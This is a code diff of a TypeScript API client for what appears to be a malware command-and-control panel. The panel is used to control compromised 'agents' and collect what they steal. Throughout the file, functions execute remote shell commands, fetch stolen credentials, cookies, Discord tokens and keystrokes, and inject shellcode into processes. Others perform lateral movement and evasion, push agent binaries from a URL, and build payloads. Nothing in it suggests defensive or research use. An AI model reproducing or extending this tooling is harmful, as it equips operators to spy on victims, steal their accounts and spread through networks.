@@ -1,255 +1,297 @@
-import axios, { AxiosInstance, InternalAxiosRequestConfig, AxiosResponse } from 'axios'
-import type { Agent, Task, FileTransfer, Credential, Cookie, DiscordToken, Keystroke, Screenshot, ProcessInfo, LateralMove, EvasionAction, Module } from '@/types'
+import type { Agent, Task, FileTransfer, Credential, Cookie, DiscordToken, Keystroke, Screenshot, ProcessInfo, LateralMove, EvasionAction, Module, PayloadConfig, BuildResult } from '@/types'
 
-interface LoginResponse {
-  token: string
-  user: { username: string }
-}
+const API_BASE = import.meta.env.VITE_API_BASE || 'http://localhost:8080'
+const WS_BASE = import.meta.env.VITE_WS_BASE || 'ws://localhost:8081'
 
-class APIService {
-  private client: AxiosInstance
+class ApiClient {
+  private token: string | null = null
   private ws: WebSocket | null = null
-  private wsUrl: string
-  private messageHandlers: Map<string, (data: any) => void> = new Map()
+  private messageHandlers: Map<string, Set<(data: any) => void>> = new Map()
   private reconnectAttempts = 0
   private maxReconnectAttempts = 5
   private reconnectDelay = 1000
+  private agentId: string | null = null
 
-  constructor() {
-    this.wsUrl = (import.meta as any).env?.VITE_WS_URL || 'ws://localhost:8080/ws'
-    this.client = axios.create({
-      baseURL: '/api',
-      timeout: 30000,
-      headers: { 'Content-Type': 'application/json' }
+  setToken(token: string | null) {
+    this.token = token
+    if (token) {
+      localStorage.setItem('auth_token', token)
+    } else {
+      localStorage.removeItem('auth_token')
+    }
+  }
+
+  getToken(): string | null {
+    if (!this.token) {
+      this.token = localStorage.getItem('auth_token')
+    }
+    return this.token
+  }
+
+  private async request<T>(endpoint: string, options: RequestInit = {}): Promise<T> {
+    const token = this.getToken()
+    const headers: Record<string, string> = {
+      'Content-Type': 'application/json',
+      ...(options.headers as Record<string, string>),
+    }
+    if (token) {
+      headers['Authorization'] = `Bearer ${token}`
+    }
+
+    const response = await fetch(`${API_BASE}${endpoint}`, {
+      ...options,
+      headers,
     })
 
-    this.client.interceptors.request.use((config: InternalAxiosRequestConfig) => {
-      const token = localStorage.getItem('auth_token')
-      if (token) {
-        config.headers.Authorization = `Bearer ${token}`
-      }
-      return config
-    })
+    if (response.status === 401) {
+      this.setToken(null)
+      window.location.href = '/login'
+      throw new Error('Unauthorized')
+    }
 
-    this.client.interceptors.response.use(
-      (response: AxiosResponse) => response.data,
-      (error) => {
-        if (error.response?.status === 401) {
-          localStorage.removeItem('auth_token')
-          window.location.href = '/login'
-        }
-        return Promise.reject(error.response?.data?.error || error.message)
-      }
-    )
+    if (!response.ok) {
+      const error = await response.json().catch(() => ({ message: 'Request failed' }))
+      throw new Error(error.message || 'Request failed')
+    }
+
+    return response.json()
   }
 
   // Auth
-  async login(username: string, password: string) {
-    const data = await this.client.post<LoginResponse>('/auth/login', { username, password }) as unknown as LoginResponse
-    if (data.token) localStorage.setItem('auth_token', data.token)
-    return data
+  async login(username: string, password: string): Promise<{ token: string; user: { username: string } }> {
+    const result = await this.request<{ token: string; user: { username: string } }>('/api/auth/login', {
+      method: 'POST',
+      body: JSON.stringify({ username, password }),
+    })
+    this.setToken(result.token)
+    return result
   }
 
-  async logout() {
-    await this.client.post('/auth/logout')
-    localStorage.removeItem('auth_token')
-    this.disconnectWS()
+  async register(username: string, password: string): Promise<{ token: string; user: { username: string } }> {
+    const result = await this.request<{ token: string; user: { username: string } }>('/api/auth/register', {
+      method: 'POST',
+      body: JSON.stringify({ username, password }),
+    })
+    this.setToken(result.token)
+    return result
   }
 
   // Agents
   async getAgents(): Promise<Agent[]> {
-    return this.client.get('/agents')
+    return this.request<Agent[]>('/api/agents')
   }
 
   async getAgent(id: string): Promise<Agent> {
-    return this.client.get(`/agents/${id}`)
+    return this.request<Agent>(`/api/agents/${id}`)
   }
 
-  async deleteAgent(id: string) {
-    return this.client.delete(`/agents/${id}`)
-  }
-
-  async updateAgent(id: string, data: Partial<Agent>) {
-    return this.client.patch(`/agents/${id}`, data)
-  }
-
-  async executeShell(agentId: string, command: string): Promise<Task> {
-    return this.client.post(`/agents/${agentId}/shell`, { command })
-  }
-
-  async takeScreenshot(agentId: string): Promise<Task> {
-    return this.client.post(`/agents/${agentId}/screenshot`, {})
-  }
-
-  async sleep(agentId: string, seconds: number): Promise<Task> {
-    return this.client.post(`/agents/${agentId}/sleep`, { seconds })
-  }
-
-  async uninstall(agentId: string): Promise<Task> {
-    return this.client.post(`/agents/${agentId}/uninstall`, {})
-  }
-
-  async updateAgentBinary(agentId: string, url: string): Promise<Task> {
-    return this.client.post(`/agents/${agentId}/update`, { url })
+  async deleteAgent(id: string): Promise<void> {
+    return this.request<void>(`/api/agents/${id}`, { method: 'DELETE' })
   }
 
   // Tasks
   async getTasks(agentId: string): Promise<Task[]> {
-    return this.client.get(`/agents/${agentId}/tasks`)
+    return this.request<Task[]>(`/api/agents/${agentId}/tasks`)
   }
 
-  async getTask(id: string): Promise<Task> {
-    return this.client.get(`/tasks/${id}`)
+  async executeShell(agentId: string, command: string): Promise<Task> {
+    return this.request<Task>(`/api/agents/${agentId}/shell`, {
+      method: 'POST',
+      body: JSON.stringify({ command }),
+    })
   }
 
-  async cancelTask(id: string) {
-    return this.client.post(`/tasks/${id}/cancel`)
+  async takeScreenshot(agentId: string): Promise<Task> {
+    return this.request<Task>(`/api/agents/${agentId}/screenshot`, {
+      method: 'POST',
+    })
+  }
+
+  async sleep(agentId: string, seconds: number): Promise<Task> {
+    return this.request<Task>(`/api/agents/${agentId}/sleep`, {
+      method: 'POST',
+      body: JSON.stringify({ seconds }),
+    })
+  }
+
+  async uninstall(agentId: string): Promise<Task> {
+    return this.request<Task>(`/api/agents/${agentId}/uninstall`, {
+      method: 'POST',
+    })
+  }
+
+  async updateAgentBinary(agentId: string, url: string): Promise<Task> {
+    return this.request<Task>(`/api/agents/${agentId}/update`, {
+      method: 'POST',
+      body: JSON.stringify({ url }),
+    })
   }
 
   // File Transfers
   async getFileTransfers(agentId: string): Promise<FileTransfer[]> {
-    return this.client.get(`/agents/${agentId}/files`)
+    return this.request<FileTransfer[]>(`/api/agents/${agentId}/files`)
   }
 
-  async uploadFile(agentId: string, file: File, remotePath: string): Promise<FileTransfer> {
-    const formData = new FormData()
-    formData.append('file', file)
-    formData.append('remote_path', remotePath)
-    return this.client.post(`/agents/${agentId}/files/upload`, formData, {
-      headers: { 'Content-Type': 'multipart/form-data' }
+  async downloadFile(agentId: string, path: string): Promise<Task> {
+    return this.request<Task>(`/api/agents/${agentId}/files/download`, {
+      method: 'POST',
+      body: JSON.stringify({ path }),
     })
   }
 
-  async downloadFile(agentId: string, remotePath: string): Promise<FileTransfer> {
-    return this.client.post(`/agents/${agentId}/files/download`, { remote_path: remotePath })
-  }
-
-  async listDirectory(agentId: string, path: string): Promise<any[]> {
-    return this.client.get(`/agents/${agentId}/files/list`, { params: { path } })
-  }
-
-  // Payload builder
-  async buildPayload(formData: FormData): Promise<any> {
-    // Let axios set the multipart boundary itself — do NOT force a content-type,
-    // otherwise the boundary is missing and the server can't parse the form.
-    const res = await this.client.post('/payloads/build', formData, {
-      headers: { 'Content-Type': undefined },
+  async uploadFile(agentId: string, path: string, data: string): Promise<Task> {
+    return this.request<Task>(`/api/agents/${agentId}/files/upload`, {
+      method: 'POST',
+      body: JSON.stringify({ path, data }),
     })
-    return res
   }
 
-  async getPayloadHistory(): Promise<any[]> {
-    return this.client.get('/payloads/history')
-  }
-
-  async downloadPayload(id: string, filename: string) {
-    const response = await fetch(`/api/payloads/${id}/download`, {
-      headers: { 'Authorization': `Bearer ${localStorage.getItem('auth_token')}` }
+  async listDirectory(agentId: string, path: string): Promise<{ files: FileTransfer[] }> {
+    return this.request<{ files: FileTransfer[] }>(`/api/agents/${agentId}/files/list`, {
+      method: 'POST',
+      body: JSON.stringify({ path }),
     })
-    if (!response.ok) throw new Error('Download failed')
-    const blob = await response.blob()
-    const url = window.URL.createObjectURL(blob)
-    const a = document.createElement('a')
-    a.href = url
-    a.download = filename
-    document.body.appendChild(a)
-    a.click()
-    window.URL.revokeObjectURL(url)
-    document.body.removeChild(a)
   }
 
-  async deletePayload(id: string) {
-    return this.client.delete(`/payloads/${id}`)
-  }
+  // Credentials
   async getCredentials(agentId: string): Promise<Credential[]> {
-    return this.client.get(`/agents/${agentId}/credentials`)
+    return this.request<Credential[]>(`/api/agents/${agentId}/credentials`)
   }
 
+  // Cookies
   async getCookies(agentId: string): Promise<Cookie[]> {
-    return this.client.get(`/agents/${agentId}/cookies`)
+    return this.request<Cookie[]>(`/api/agents/${agentId}/cookies`)
   }
 
+  // Discord Tokens
   async getDiscordTokens(agentId: string): Promise<DiscordToken[]> {
-    return this.client.get(`/agents/${agentId}/discord`)
+    return this.request<DiscordToken[]>(`/api/agents/${agentId}/discord`)
   }
 
+  // Keystrokes
   async getKeystrokes(agentId: string): Promise<Keystroke[]> {
-    return this.client.get(`/agents/${agentId}/keystrokes`)
+    return this.request<Keystroke[]>(`/api/agents/${agentId}/keystrokes`)
   }
 
   // Screenshots
   async getScreenshots(agentId: string): Promise<Screenshot[]> {
-    return this.client.get(`/agents/${agentId}/screenshots`)
-  }
-
-  async downloadScreenshot(id: string): Promise<Blob> {
-    return this.client.get(`/screenshots/${id}/download`, { responseType: 'blob' })
-  }
-
-  async deleteScreenshot(id: string) {
-    return this.client.delete(`/screenshots/${id}`)
+    return this.request<Screenshot[]>(`/api/agents/${agentId}/screenshots`)
   }
 
   // Processes
   async getProcesses(agentId: string): Promise<ProcessInfo[]> {
-    return this.client.get(`/agents/${agentId}/processes`)
+    return this.request<ProcessInfo[]>(`/api/agents/${agentId}/processes`)
   }
 
-  async suspendProcess(agentId: string, pid: number) {
-    return this.client.post(`/agents/${agentId}/processes/${pid}/suspend`)
+  async suspendProcess(agentId: string, pid: number): Promise<void> {
+    return this.request<void>(`/api/agents/${agentId}/processes/suspend`, {
+      method: 'POST',
+      body: JSON.stringify({ pid }),
+    })
   }
 
-  async resumeProcess(agentId: string, pid: number) {
-    return this.client.post(`/agents/${agentId}/processes/${pid}/resume`)
+  async resumeProcess(agentId: string, pid: number): Promise<void> {
+    return this.request<void>(`/api/agents/${agentId}/processes/resume`, {
+      method: 'POST',
+      body: JSON.stringify({ pid }),
+    })
   }
 
-  async killProcess(agentId: string, pid: number) {
-    return this.client.post(`/agents/${agentId}/processes/${pid}/kill`)
+  async killProcess(agentId: string, pid: number): Promise<void> {
+    return this.request<void>(`/api/agents/${agentId}/processes/kill`, {
+      method: 'POST',
+      body: JSON.stringify({ pid }),
+    })
+  }
+
+  async injectProcess(agentId: string, pid: number, shellcode: string): Promise<Task> {
+    return this.request<Task>(`/api/agents/${agentId}/processes/inject`, {
+      method: 'POST',
+      body: JSON.stringify({ pid, shellcode }),
+    })
   }
 
   // Lateral Movement
   async getLateralMoves(agentId: string): Promise<LateralMove[]> {
-    return this.client.get(`/agents/${agentId}/lateral`)
+    return this.request<LateralMove[]>(`/api/agents/${agentId}/lateral`)
   }
 
-  async scanNetwork(agentId: string, range: string): Promise<any[]> {
-    const res = await this.client.post(`/agents/${agentId}/lateral/scan`, { range })
-    return res.data || res || []
+  async scanNetwork(agentId: string, subnet: string): Promise<Task> {
+    return this.request<Task>(`/api/agents/${agentId}/lateral/scan`, {
+      method: 'POST',
+      body: JSON.stringify({ subnet }),
+    })
   }
 
-  async executeLateralMove(agentId: string, data: { technique: string; target: string; credentials_id?: string }): Promise<LateralMove> {
-    return this.client.post(`/agents/${agentId}/lateral/execute`, data)
+  async pivotAgent(agentId: string, target: string, technique: string): Promise<Task> {
+    return this.request<Task>(`/api/agents/${agentId}/lateral/pivot`, {
+      method: 'POST',
+      body: JSON.stringify({ target, technique }),
+    })
   }
 
   // Evasion
   async getEvasionResults(agentId: string): Promise<EvasionAction[]> {
-    return this.client.get(`/agents/${agentId}/evasion`)
+    return this.request<EvasionAction[]>(`/api/agents/${agentId}/evasion`)
   }
 
-  async executeEvasion(agentId: string, techniqueId: string): Promise<EvasionAction> {
-    return this.client.post(`/agents/${agentId}/evasion/execute`, { technique_id: techniqueId })
+  async runEvasion(agentId: string, technique: string, target: string): Promise<Task> {
+    return this.request<Task>(`/api/agents/${agentId}/evasion/run`, {
+      method: 'POST',
+      body: JSON.stringify({ technique, target }),
+    })
   }
 
   // Modules
   async getModules(agentId: string): Promise<Module[]> {
-    return this.client.get(`/agents/${agentId}/modules`)
+    return this.request<Module[]>(`/api/agents/${agentId}/modules`)
   }
 
-  async loadModule(agentId: string, moduleId: string) {
-    return this.client.post(`/agents/${agentId}/modules/${moduleId}/load`)
+  async loadModule(agentId: string, moduleId: string): Promise<Task> {
+    return this.request<Task>(`/api/agents/${agentId}/modules/load`, {
+      method: 'POST',
+      body: JSON.stringify({ module_id: moduleId }),
+    })
   }
 
-  async unloadModule(agentId: string, moduleId: string) {
-    return this.client.post(`/agents/${agentId}/modules/${moduleId}/unload`)
+  async unloadModule(agentId: string, moduleId: string): Promise<Task> {
+    return this.request<Task>(`/api/agents/${agentId}/modules/unload`, {
+      method: 'POST',
+      body: JSON.stringify({ module_id: moduleId }),
+    })
   }
 
-  // Stats
-  async getStats(): Promise<any> {
-    return this.client.get('/stats')
+  // Payload Building
+  async buildPayload(config: PayloadConfig): Promise<BuildResult> {
+    return this.request<BuildResult>('/api/payloads/build', {
+      method: 'POST',
+      body: JSON.stringify(config),
+    })
   }
 
-  async getHealth(): Promise<any> {
-    return this.client.get('/health')
+  async uploadAgentBinary(file: File, platform: 'windows' | 'linux'): Promise<{ success: boolean; path: string }> {
+    const formData = new FormData()
+    formData.append('file', file)
+    formData.append('platform', platform)
+
+    const token = this.getToken()
+    const headers: Record<string, string> = {}
+    if (token) {
+      headers['Authorization'] = `Bearer ${token}`
+    }
+
+    const response = await fetch(`${API_BASE}/api/payloads/upload`, {
+      method: 'POST',
+      headers,
+      body: formData,
+    })
+
+    if (!response.ok) {
+      const error = await response.json().catch(() => ({ message: 'Upload failed' }))
+      throw new Error(error.message || 'Upload failed')
+    }
+
+    return response.json()
   }
 
   // WebSocket
@@ -260,41 +302,80 @@ class APIService {
         return
       }
 
-      const url = agentId ? `${this.wsUrl}?agent_id=${agentId}` : this.wsUrl
-      this.ws = new WebSocket(url)
+      this.agentId = agentId || null
+      const wsUrl = `${WS_BASE}/ws${agentId ? `?agent_id=${agentId}` : ''}`
+      this.ws = new WebSocket(wsUrl)
 
       this.ws.onopen = () => {
+        console.log('WebSocket connected')
         this.reconnectAttempts = 0
-        console.log('[WS] Connected')
         resolve()
       }
 
       this.ws.onmessage = (event) => {
         try {
-          const msg = JSON.parse(event.data)
-          const handler = this.messageHandlers.get(msg.type)
-          if (handler) handler(msg.payload)
-        } catch (e) {
-          console.error('[WS] Parse error:', e)
+          const message = JSON.parse(event.data)
+          this.handleMessage(message)
+        } catch (error) {
+          console.error('Failed to parse WebSocket message:', error)
         }
       }
 
       this.ws.onclose = () => {
-        console.log('[WS] Disconnected')
-        this.attemptReconnect(agentId)
+        console.log('WebSocket disconnected')
+        this.attemptReconnect()
       }
 
-      this.ws.onerror = (err) => {
-        console.error('[WS] Error:', err)
-        reject(err)
+      this.ws.onerror = (error) => {
+        console.error('WebSocket error:', error)
+        if (this.reconnectAttempts === 0) {
+          reject(error)
+        }
       }
     })
   }
 
-  private attemptReconnect(agentId?: string) {
-    if (this.reconnectAttempts < this.maxReconnectAttempts) {
-      this.reconnectAttempts++
-      setTimeout(() => this.connectWS(agentId), this.reconnectDelay * this.reconnectAttempts)
+  private attemptReconnect() {
+    if (this.reconnectAttempts >= this.maxReconnectAttempts) {
+      console.log('Max reconnect attempts reached')
+      return
+    }
+
+    this.reconnectAttempts++
+    const delay = this.reconnectDelay * Math.pow(2, this.reconnectAttempts - 1)
+    console.log(`Reconnecting in ${delay}ms (attempt ${this.reconnectAttempts})`)
+
+    setTimeout(() => {
+      this.connectWS(this.agentId || undefined).catch(() => {})
+    }, delay)
+  }
+
+  private handleMessage(message: { type: string; data: any }) {
+    const handlers = this.messageHandlers.get(message.type)
+    if (handlers) {
+      handlers.forEach((handler) => handler(message.data))
+    }
+  }
+
+  onMessage(type: string, handler: (data: any) => void): () => void {
+    if (!this.messageHandlers.has(type)) {
+      this.messageHandlers.set(type, new Set())
+    }
+    this.messageHandlers.get(type)!.add(handler)
+    return () => this.offMessage(type, handler)
+  }
+
+  offMessage(type: string, handler?: (data: any) => void) {
+    if (handler) {
+      this.messageHandlers.get(type)?.delete(handler)
+    } else {
+      this.messageHandlers.delete(type)
+    }
+  }
+
+  sendMessage(type: string, data: any) {
+    if (this.ws?.readyState === WebSocket.OPEN) {
+      this.ws.send(JSON.stringify({ type, data }))
     }
   }
 
@@ -305,19 +386,9 @@ class APIService {
     }
   }
 
-  sendWS(type: string, payload: any) {
-    if (this.ws?.readyState === WebSocket.OPEN) {
-      this.ws.send(JSON.stringify({ type, payload }))
-    }
-  }
-
-  onMessage(type: string, handler: (data: any) => void) {
-    this.messageHandlers.set(type, handler)
-  }
-
-  offMessage(type: string) {
-    this.messageHandlers.delete(type)
+  isConnected(): boolean {
+    return this.ws?.readyState === WebSocket.OPEN
   }
 }
 
-export const api = new APIService()
+export const api = new ApiClient()
